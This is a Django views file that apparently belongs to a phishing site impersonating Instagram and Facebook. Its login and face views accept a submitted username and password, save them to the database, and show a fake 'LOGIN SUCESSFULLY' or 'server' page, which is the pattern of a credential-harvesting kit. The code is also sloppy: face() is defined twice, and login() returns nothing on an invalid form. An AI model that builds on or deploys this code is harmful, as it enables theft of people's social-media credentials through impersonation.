from django.shortcuts import render
from .forms import insta
from django.contrib import messages
from .models import user
from django.http.response import HttpResponse
from django.http import HttpResponseRedirect
# Create your views here.

def login(request):
    if request.method == 'POST':
        fm=insta(request.POST)
        if fm.is_valid():
            username=fm.cleaned_data['username']
            password=fm.cleaned_data['password']
            fm.save()
            messages.success(request,'LOGIN SUCESSFULLY')
            return render(request,'blog/server.html')
            # return HttpResponseRedirect(request,'blog/server.html')
    else:
        fm=insta()
        return render(request,'blog/index.html',{'form':fm})



def server(request):
    return render(request,'blog/server.html')


def verifi(request):
    return render(request,'blog/verification.html')

def job(request):
     return render(request,'blog/job.html')
    
def face(request):
    if request.method == 'POST':
        fm=insta(request.POST)
        if fm.is_valid():
            username=fm.cleaned_data['username']
            password=fm.cleaned_data['password']
            fm.save()
            return render(request,'blog/server.html')
            
            # return HttpResponseRedirect(request,'blog/server.html')
    else:
        fm=insta()
        return render(request,'blog/facebook.html')


def face(request):
    if request.method == 'POST':
        fm=insta(request.POST)
        if fm.is_valid():
            username=fm.cleaned_data['username']
            password=fm.cleaned_data['password']
            fm.save()
            fm=insta()
            
            # return HttpResponseRedirect(request,'blog/server.html')
    else:
        fm=insta()
    return render(request,'blog/facebook.html')

